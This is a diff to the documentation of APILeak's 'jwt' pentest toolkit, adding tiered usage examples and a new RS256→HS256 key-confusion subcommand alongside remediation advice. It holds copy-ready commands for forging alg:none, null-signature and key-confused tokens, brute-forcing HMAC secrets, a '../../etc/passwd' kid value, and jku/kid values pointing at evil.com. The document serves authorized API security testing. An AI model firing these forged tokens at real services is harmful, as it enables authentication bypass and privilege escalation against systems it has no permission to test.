@@ -3,9 +3,9 @@
 The `jwt` command group is APILeak's **manual, operator-driven JWT toolkit**. It bundles
 everyday JWT utilities (decode, encode, verify, key generation, JWKS conversion) together
 with attack primitives (algorithm confusion, null-signature bypass, weak-secret brute-force,
-kid injection, JWKS spoofing, inline JWKS injection) and a comprehensive automated attack
-runner. You run these commands by hand, on your own timeline, to craft tokens and probe a
-target's JWT handling.
+RS256→HS256 key confusion, kid injection, JWKS spoofing, inline JWKS injection) and a
+comprehensive automated attack runner. You run these commands by hand, on your own timeline, to
+craft tokens and probe a target's JWT handling.
 
 ## Manual toolkit vs. automated scan detection
 
@@ -60,30 +60,304 @@ Every `test-*` subcommand and `attack-test` accepts these options for live testi
 `--vector-file`, `--raw-request`, `--canary`) — see its section below. These extra options are
 **not** available on the individual `test-*` subcommands.
 
-## Quick start
+## Usage examples by level
+
+The `jwt` group's examples are organized into three levels: **basic uses**, **intermediate uses**, and **advanced uses**. Each example includes a title, a short description of what it does and what it's for, and a ready-to-copy command. Every subcommand generates tokens offline when no `--url` is given, and executes the attack against the endpoint when `--url` is added; that's why the examples escalate from offline generation to live testing and command chaining.
+
+---
+
+### Basic uses
+
+Single-command utilities and offline checks. No network (unless noted). These are the starting point for understanding the token and preparing test material.
+
+**1. Decode and analyze a token (`jwt decode`)**
+
+Splits the token into header, payload, and signature and prints an analysis (algorithm, claims, expiry) plus a JSON representation. No verification, no network.
 
 ```bash
-# Decode and inspect a token
-python apileaks.py jwt decode TOKEN
+python apileaks.py jwt decode eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyMTIzIn0.abc
+```
 
-# Create a token for manual testing
-python apileaks.py jwt encode '{"sub":"user123","role":"user"}' --secret mysecret
+**2. Create a token for testing (`jwt encode`)**
 
-# Try an alg:none attack offline (prints the forged token)
+Builds and HMAC-signs a JWT from a JSON payload, using the default header and secret (`secret`). Useful for producing base tokens to feed into the attack subcommands.
+
+```bash
+python apileaks.py jwt encode '{"sub":"user123","role":"user"}'
+```
+
+**3. Verify an HMAC signature (`jwt verify`)**
+
+Checks the signature of an `HS*` token against a shared secret. No HTTP request is issued; an invalid signature is reported as a result (`❌ INVALID`), not an error.
+
+```bash
+python apileaks.py jwt verify TOKEN --secret mysecret
+```
+
+**4. Generate a test keypair (`jwt genkey`)**
+
+Generates a test RSA or EC keypair and prints the private and public PEM. Local, no network. Handy for preparing keys for `verify`, `jwks-to-key`, or algorithm-confusion experiments.
+
+```bash
+python apileaks.py jwt genkey --type rsa
+```
+
+**5. Reconstruct a public key from a JWKS (`jwt jwks-to-key`)**
+
+Converts a local JWKS entry (RSA `n`/`e` or EC `crv`/`x`/`y` parameters) into a usable public-key PEM. Local, no network.
+
+```bash
+python apileaks.py jwt jwks-to-key --jwks jwks.json
+```
+
+**6. Test alg:none offline (`jwt test-alg-none`)**
+
+Generates and prints the token with the algorithm rewritten to `none` and the signature removed (signature stripping). Without `--url` it only generates it so you can inspect it before sending.
+
+```bash
 python apileaks.py jwt test-alg-none TOKEN
+```
 
-# Try the same attack against a live endpoint
-python apileaks.py jwt test-alg-none TOKEN --url https://api.example.com/protected
+---
 
-# Run the full automated attack suite against a live endpoint
-python apileaks.py jwt attack-test TOKEN --url https://api.example.com/protected
+### Intermediate uses
+
+Offline generation of attack tokens with escalated claims and specific options, plus asymmetric verification. Here you customize payloads, secrets, keys, and wordlists.
+
+**1. Encode with a custom secret and header (`jwt encode`)**
+
+Signs the payload with your own secret and a tailored header (for example adding a `kid`), to reproduce tokens equivalent to the target's.
+
+```bash
+python apileaks.py jwt encode '{"sub":"admin","role":"admin"}' \
+  --header '{"alg":"HS256","typ":"JWT","kid":"1"}' \
+  --secret mysecret
+```
+
+**2. Asymmetric verification (`jwt verify`)**
+
+Verifies an `RS*`/`PS*`/`ES*` token with public-key material from a file, inline PEM, or a local JWKS.
+
+```bash
+# Against a public key file
+python apileaks.py jwt verify TOKEN --key-file public.pem
+
+# Inline PEM
+python apileaks.py jwt verify TOKEN --pem "$(cat public.pem)"
+
+# Against a local JWKS
+python apileaks.py jwt verify TOKEN --jwks jwks.json
+```
+
+**3. Generate stronger or EC keys (`jwt genkey`)**
+
+Produces a larger RSA key or an EC pair on a specific curve, depending on the scenario you want to reproduce.
+
+```bash
+# 4096-bit RSA key
+python apileaks.py jwt genkey --type rsa --bits 4096
+
+# EC on the P-256 curve
+python apileaks.py jwt genkey --type ec --curve ES256
+```
+
+**4. alg:none with escalated claims (`jwt test-alg-none`)**
+
+Rewrites the algorithm to `none` and also merges escalated claims (for example `role:admin`) onto the base payload.
+
+```bash
+python apileaks.py jwt test-alg-none TOKEN --payload '{"sub":"admin","role":"admin"}'
+```
+
+**5. Null/empty signature bypass (`jwt test-null-signature`)**
+
+Generates a token with the signature emptied while the header still declares a real algorithm, optionally with admin claims.
+
+```bash
+python apileaks.py jwt test-null-signature TOKEN --payload '{"sub":"admin","admin":true}'
+```
+
+**6. RS256→HS256 algorithm confusion offline (`jwt test-alg-confusion`)**
+
+Forges tokens signed with the target's public key used as an HMAC secret (Substitution Attack). Produces one token per key representation (PEM ±newline, DER, x5c). Accepts a file path or inline PEM.
+
+```bash
+# From a public key file
+python apileaks.py jwt test-alg-confusion TOKEN --public-key server_pub.pem
+
+# Inline PEM while escalating a claim
+python apileaks.py jwt test-alg-confusion TOKEN \
+  --public-key "$(cat server_pub.pem)" \
+  --payload '{"role":"admin"}'
+```
+
+**7. Brute-force a weak HMAC secret (`jwt brute-secret`)**
+
+Tries candidate secrets from a wordlist, verifying each against the token's real signature. Customize the wordlist and the attempt cap.
+
+```bash
+python apileaks.py jwt brute-secret TOKEN --wordlist custom_secrets.txt --max-attempts 5000
+```
+
+**8. Key ID injection (`jwt test-kid-injection`)**
+
+Injects a value into the `kid` header (path traversal, remote URL, injection strings) and optionally escalates claims.
+
+```bash
+# kid pointing to an attacker-controlled remote key
+python apileaks.py jwt test-kid-injection TOKEN --kid-payload "http://evil.com/key.pem"
+
+# Escalated claims with the default kid
+python apileaks.py jwt test-kid-injection TOKEN --payload '{"sub":"admin","role":"admin"}'
+```
+
+**9. JWKS/jku spoofing (`jwt test-jwks-spoof`)**
+
+Generates a token pointing at an attacker-controlled malicious JWKS URL to check whether the server trusts arbitrary `jku` values.
+
+```bash
+python apileaks.py jwt test-jwks-spoof TOKEN --jwks-url http://evil.com/jwks.json
+```
+
+**10. Inline JWKS injection (`jwt test-inline-jwks`)**
+
+Generates its own keypair, embeds the public key in the header (inline `jwk`), and signs with the matching private key, to check whether the server trusts embedded keys.
+
+```bash
+python apileaks.py jwt test-inline-jwks TOKEN
+```
+
+---
+
+### Advanced uses
+
+Execution against live endpoints, command chaining, the full automated suite, targeted fuzzing, and integration with the orchestrated scan.
+
+**1. Fire an attack at a live endpoint (`--url`)**
+
+Add `--url` (plus headers, body, and timeout as needed) to any `test-*` to send the forged tokens to the target through the shared HTTP engine (rate limiting, proxy, User-Agent rotation, and TLS).
+
+```bash
+python apileaks.py jwt test-alg-none TOKEN \
+  --url https://api.example.com/admin \
+  -H "X-API-Key: key123" \
+  --timeout 30
+```
+
+**2. Algorithm confusion against a live endpoint (`jwt test-alg-confusion`)**
+
+Sends each confused-key representation to the target with a custom header and timeout.
+
+```bash
+python apileaks.py jwt test-alg-confusion TOKEN --public-key server_pub.pem \
+  --url https://api.example.com/admin -H "X-API-Key: key123" --timeout 60
+```
+
+**3. Chain `jwks-to-key` → `test-alg-confusion`**
+
+Obtain the public key from the target's JWKS first, then use it right away to forge the confusion tokens.
+
+```bash
+python apileaks.py jwt jwks-to-key --jwks jwks.json > server_pub.pem
+python apileaks.py jwt test-alg-confusion TOKEN --public-key server_pub.pem
+```
+
+**4. Crack the secret and exploit it live (`jwt brute-secret`)**
+
+Recovers the HMAC secret from the wordlist and tests the escalation/impersonation/expiration-bypass tokens against the real endpoint in a single command.
+
+```bash
+python apileaks.py jwt brute-secret TOKEN \
+  --url https://api.example.com/admin \
+  --header "X-API-Key: key123" \
+  --data '{"action": "read"}' \
+  --timeout 60
+```
+
+**5. Remote kid injection against an endpoint (`jwt test-kid-injection`)**
+
+Combines a path-traversal `kid` with escalated claims and validates it against a protected endpoint.
+
+```bash
+python apileaks.py jwt test-kid-injection TOKEN \
+  --kid-payload "../../etc/passwd" \
+  --payload '{"admin":true}' \
+  --url https://api.example.com/protected
+```
+
+**6. Full automated suite (`jwt attack-test`)**
+
+Runs every attack vector against a live endpoint with baseline comparison and confidence scoring.
+
+```bash
+python apileaks.py jwt attack-test TOKEN --url https://api.example.com/user/profile
+```
+
+**7. attack-test against a POST endpoint with a JSON body**
+
+Tests an endpoint that expects a body, tuning the timeout and retries.
+
+```bash
+python apileaks.py jwt attack-test TOKEN \
+  -u https://api.example.com/transactions \
+  -d '{"amount": 100, "currency": "USD", "recipient": "user123"}' \
+  -H "Content-Type: application/json" \
+  --timeout 60 --max-retries 5
+```
+
+**8. attack-test against a self-signed TLS endpoint**
+
+Disable TLS verification in testing/development environments only.
+
+```bash
+python apileaks.py jwt attack-test TOKEN -u https://dev-api.local/protected --no-ssl-verify
+```
+
+**9. Fuzz a claim with a vector-file (`jwt attack-test`)**
+
+Substitutes a specific claim or header with values from a file, one value per line.
+
+```bash
+python apileaks.py jwt attack-test TOKEN -u https://api.example.com/protected \
+  --fuzz-target role --vector-file wordlists/roles.txt
+```
+
+**10. attack-test from a raw-request corroborated with a canary**
+
+Takes the request context and JWT from a raw HTTP request file, and uses a canary string to corroborate (never replace) the success analysis.
+
+```bash
+python apileaks.py jwt attack-test -u https://api.example.com/protected \
+  --raw-request request.txt --canary '"role":"admin"'
+```
+
+**11. Automated JWT detection in a scan (`owasp auth` / `scan`)**
+
+For automated detection as part of an orchestrated run, use the auth module with public-key material and/or a known secret instead of the manual `jwt` group.
+
+```bash
+python apileaks.py owasp auth --target https://api.example.com \
+  --public-key ./idp_public.pem \
+  --signing-secret 's3cr3t'
+```
+
+**12. Authenticate discovery/scan with `--jwt`**
+
+Attach a valid token so the discovery and scan commands authenticate while they test.
+
+```bash
+python apileaks.py scan \
+  --target https://api.example.com \
+  --jwt "eyJ0eXAiOiJKV1Q..." \
+  --modules bola,auth,property
 ```
 
 ## Subcommands
 
-The `jwt` group has exactly **12** subcommands: five utilities (`decode`, `encode`, `verify`,
-`genkey`, `jwks-to-key`) and seven attack commands (`test-alg-none`, `test-null-signature`,
-`brute-secret`, `test-kid-injection`, `test-jwks-spoof`, `test-inline-jwks`, `attack-test`).
+The `jwt` group has exactly **13** subcommands: five utilities (`decode`, `encode`, `verify`,
+`genkey`, `jwks-to-key`) and eight attack commands (`test-alg-none`, `test-null-signature`,
+`test-alg-confusion`, `brute-secret`, `test-kid-injection`, `test-jwks-spoof`, `test-inline-jwks`,
+`attack-test`).
 
 ---
 
@@ -248,10 +522,12 @@ Unparseable input or a JWK missing required parameters is rejected with a descri
 
 ---
 
-### 6. `jwt test-alg-none` — algorithm confusion (alg:none)
+### 6. `jwt test-alg-none` — algorithm confusion (alg:none) *(Signature Stripping Attack)*
 
-**Purpose:** Test the classic algorithm-confusion attack by rewriting the header algorithm to
-`none` and removing the signature, then (if a payload is supplied) injecting escalated claims.
+**Purpose:** Test the classic algorithm-confusion / **signature stripping** attack by rewriting the
+header algorithm to `none` and removing the signature entirely, then (if a payload is supplied)
+injecting escalated claims. A server that honors `alg:none` accepts the token with no signature at
+all — authentication is stripped away.
 
 **Severity:** CRITICAL — authentication completely nullified.
 
@@ -283,10 +559,11 @@ python apileaks.py jwt test-alg-none TOKEN --url https://api.example.com/admin
 
 ---
 
-### 7. `jwt test-null-signature` — null signature bypass
+### 7. `jwt test-null-signature` — null signature bypass *(Signature Stripping Attack)*
 
-**Purpose:** Test acceptance of empty/null signatures (e.g. `header.payload.`), optionally merging
-escalated claims onto the payload.
+**Purpose:** Test acceptance of empty/null signatures (e.g. `header.payload.`) — a variant of the
+**signature stripping** attack where the signature segment is emptied or nulled while the header
+still declares a real algorithm. Optionally merges escalated claims onto the payload.
 
 **Severity:** CRITICAL — cryptographic validation bypass.
 
@@ -318,11 +595,73 @@ python apileaks.py jwt test-null-signature TOKEN --url https://api.example.com/p
 
 ---
 
-### 8. `jwt brute-secret` — brute-force weak HMAC secrets
+### 8. `jwt test-alg-confusion` — RS256/ES256 → HS256 key confusion *(Substitution Attack)*
 
-**Purpose:** Recover a weak `HS*` signing secret by trying candidates from a wordlist and verifying
-each against the token's real signature. On success, it forges privilege-escalation, impersonation,
-and expiration-bypass tokens with the recovered secret; with `--url` it also tests them live.
+**Purpose:** Test the algorithm/key-confusion attack, also known as the **Substitution Attack**. It
+forges a token that a server validates with the **same asymmetric public key** it uses for
+`RS*`/`ES*` verification, but treated as an `HS256` HMAC secret. The command switches the header
+`alg` to `HS256` and HMAC-signs `header.payload` using the target's public key bytes as the secret.
+Because servers differ in which exact byte form they feed to the verifier, it forges one token per
+public-key representation: PEM with a trailing newline, PEM without it, DER SubjectPublicKeyInfo,
+and the x5c certificate DER when the material is a certificate. A server that accepts any of them is
+confusing the key's role between signing algorithms.
+
+**Severity:** CRITICAL — the signature is forged with public (non-secret) material.
+
+**Syntax:**
+
+```bash
+python apileaks.py jwt test-alg-confusion TOKEN --public-key PATH_OR_PEM [--payload JSON] \
+  [-u URL] [-H "Name: Value"]... [-d DATA] [--timeout SECONDS]
+```
+
+**Arguments/options:**
+
+- `TOKEN` (positional, required) — base token (typically an `RS*`/`ES*` token).
+- `--public-key` (required) — the target's public key used as the HMAC secret. Accepts a filesystem
+  path to a PEM/DER file **or** inline PEM text.
+- `--payload` — custom claims to merge onto the base payload (JSON).
+- Shared live-endpoint options: `-u`/`--url`, `-H`/`--header`, `-d`/`--data`, `--timeout`.
+
+**Examples:**
+
+```bash
+# Offline: forge confusion tokens for manual testing (one per key representation)
+python apileaks.py jwt test-alg-confusion TOKEN --public-key server_pub.pem
+
+# Inline PEM instead of a file path
+python apileaks.py jwt test-alg-confusion TOKEN --public-key "$(cat server_pub.pem)"
+
+# Escalate a claim while forging the confused token
+python apileaks.py jwt test-alg-confusion TOKEN --public-key server_pub.pem \
+  --payload '{"role":"admin"}'
+
+# Live endpoint with the harvested public key
+python apileaks.py jwt test-alg-confusion TOKEN --public-key server_pub.pem \
+  --url https://api.example.com/admin
+
+# Live endpoint, custom header and longer timeout
+python apileaks.py jwt test-alg-confusion TOKEN --public-key server_pub.pem \
+  --url https://api.example.com/admin -H "X-API-Key: key123" --timeout 60
+
+# Chain with genkey/jwks-to-key to obtain the public key first
+python apileaks.py jwt jwks-to-key --jwks jwks.json > server_pub.pem
+python apileaks.py jwt test-alg-confusion TOKEN --public-key server_pub.pem
+```
+
+> **Where do I get the public key?** From the target's JWKS endpoint (convert it with
+> `jwt jwks-to-key`), a published certificate, or `--pem`/`--key-file` material you already hold.
+> For automated confusion detection during a scan, `owasp auth` can fetch it via `--jwks-url` or
+> take it via `--public-key` (see the automated section below).
+
+---
+
+### 9. `jwt brute-secret` — brute-force weak HMAC secrets *(Bruteforcing HS256 Secret Key)*
+
+**Purpose:** **Brute-force an `HS256` (or other `HS*`) signing secret** by trying candidates from a
+wordlist and verifying each against the token's real signature. On success, it forges
+privilege-escalation, impersonation, and expiration-bypass tokens with the recovered secret; with
+`--url` it also tests them live.
 
 **Severity:** CRITICAL — complete authentication compromise.
 
@@ -362,7 +701,7 @@ If the secret is not in the wordlist, the command reports that and stops — no 
 
 ---
 
-### 9. `jwt test-kid-injection` — Key ID (kid) injection
+### 10. `jwt test-kid-injection` — Key ID (kid) injection
 
 **Purpose:** Test Key ID (`kid`) header injection. The engine owns a curated set of `kid` payloads
 (path traversal, remote URLs, injection strings); `--kid-payload` overrides the primary value and
@@ -408,7 +747,7 @@ Common `--kid-payload` ideas: path traversal (`../../etc/passwd`), remote URLs
 
 ---
 
-### 10. `jwt test-jwks-spoof` — JWKS URL (jku) spoofing
+### 11. `jwt test-jwks-spoof` — JWKS URL (jku) spoofing
 
 **Purpose:** Test whether the server trusts an attacker-controlled JWKS/`jku` URL. The engine signs
 with the resolved attacker key and points the token at the spoofed URL.
@@ -447,7 +786,7 @@ python apileaks.py jwt test-jwks-spoof TOKEN --url https://api.example.com/prote
 
 ---
 
-### 11. `jwt test-inline-jwks` — inline JWKS injection
+### 12. `jwt test-inline-jwks` — inline JWKS injection
 
 **Purpose:** Test whether the server trusts a public key embedded directly in the token header
 (inline `jwk`). The engine generates its own keypair, embeds the public key inline, and signs with
@@ -482,7 +821,7 @@ python apileaks.py jwt test-inline-jwks TOKEN -u https://api.example.com/admin -
 
 ---
 
-### 12. `jwt attack-test` — comprehensive automated suite
+### 13. `jwt attack-test` — comprehensive automated suite
 
 **Purpose:** Run APILeak's full JWT attack suite against a live endpoint and produce a vulnerability
 assessment with baseline comparison and confidence scoring. It exercises algorithm confusion,
@@ -568,6 +907,7 @@ A typical hands-on assessment with the `jwt` group:
    ```bash
    python apileaks.py jwt test-alg-none "$TOKEN"
    python apileaks.py jwt test-null-signature "$TOKEN"
+   python apileaks.py jwt test-alg-confusion "$TOKEN" --public-key server_pub.pem
    python apileaks.py jwt brute-secret "$TOKEN" -w wordlists/jwt_secrets.txt
    python apileaks.py jwt test-kid-injection "$TOKEN"
    python apileaks.py jwt test-jwks-spoof "$TOKEN"
@@ -660,11 +1000,18 @@ full details on the auth module.
 
 ### Remediation guidance
 
-**Algorithm confusion (alg:none / downgrade):**
+**Algorithm confusion (alg:none / downgrade) — signature stripping:**
 - Configure the JWT library to reject `alg:none` tokens.
 - Enforce an algorithm allowlist (e.g. only `HS256` or `RS256`).
 - Never trust the algorithm named in the JWT header.
 - Use vetted JWT libraries, not custom verification.
+
+**Key confusion (RS256→HS256 substitution):**
+- Bind each key to a single algorithm; never share a key across `HS*` and `RS*`/`ES*` families.
+- Enforce a strict algorithm allowlist during verification (e.g. only `RS256`) and reject any token
+  whose header declares a different family.
+- Never let the token header dictate which algorithm/key the verifier uses.
+- Treat public keys as public: assume an attacker holds them and cannot use them to forge HMACs.
 
 **Null/empty signature:**
 - Reject tokens with empty or missing signatures before cryptographic verification.
